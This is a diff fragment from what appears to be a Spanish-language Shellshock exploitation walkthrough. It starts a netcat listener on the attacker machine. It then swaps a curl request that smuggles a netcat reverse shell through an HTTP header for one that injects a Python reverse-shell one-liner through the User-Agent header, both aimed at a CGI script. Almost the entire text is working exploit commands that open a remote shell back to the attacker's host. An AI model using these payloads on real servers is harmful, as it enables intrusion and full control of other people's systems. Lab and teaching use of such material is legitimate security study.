@@ -57,5 +57,5 @@ En maquina de ataque:
 $ nc -lvp 4242
 
 # En otra terminal
-$ curl 192.168.139.128/cgi-bin/test.sh  -H "custom:() { :; }; /bin/nc 192.168.139.1 4242 -e /bin/bash"
+$ curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.139.1\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://192.168.139.128/cgi-bin/test.sh
 ```
